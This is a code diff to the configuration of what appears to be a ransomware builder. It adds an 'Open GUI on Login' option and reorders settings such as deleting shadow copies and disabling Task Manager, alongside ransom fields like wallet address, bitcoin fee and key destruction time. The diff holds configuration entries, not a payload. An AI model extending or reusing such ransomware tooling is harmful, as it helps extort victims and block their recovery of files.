@@ -138,6 +138,33 @@ BUILDER_CONFIG_ITEMS = OrderedDict([
             }
     ),
     (
+        "open_gui_on_login", {
+            "label": "Open GUI on Login",
+            "input_object_name": "OpenGuiOnLoginCheckbox",
+            "config_area": "Ransomware Settings",
+            "validate": False,
+            "default": True
+            }
+    ),
+    (
+        "delete_shadow_copies", {
+            "label": "Delete Shadow Copies",
+            "input_object_name": "DeleteShadowCopiesCheckbox",
+            "config_area": "Ransomware Settings",
+            "validate": False,
+            "default": True
+            }
+    ),
+    (
+        "disable_task_manager", {
+            "label": "Disable Task Manager",
+            "input_object_name": "DisableTaskManagerCheckbox",
+            "config_area": "Ransomware Settings",
+            "validate": False,
+            "default": False
+            }
+    ),
+    (
         "gui_title", {
             "label": "GUI Title",
             "label_object_name": "GuiTitleLabel",
@@ -161,24 +188,6 @@ BUILDER_CONFIG_ITEMS = OrderedDict([
             "config_area": "Ransomware Settings",
             "validate": True,
             "default": "259200"
-            }
-    ),
-    (
-        "delete_shadow_copies", {
-            "label": "Delete Shadow Copies",
-            "input_object_name": "DeleteShadowCopiesCheckbox",
-            "config_area": "Ransomware Settings",
-            "validate": False,
-            "default": True
-            }
-    ),
-    (
-        "disable_task_manager", {
-            "label": "Disable Task Manager",
-            "input_object_name": "DisableTaskManagerCheckbox",
-            "config_area": "Ransomware Settings",
-            "validate": False,
-            "default": False
             }
     ),
     (
@@ -338,6 +347,7 @@ RUNTIME_CONFIG_ITEMS = [
     "encrypt_user_home",
     "encrypted_file_extension",
     "disable_task_manager",
+    "open_gui_on_login",
     "wallet_address",
     "bitcoin_fee",
     "key_destruction_time",
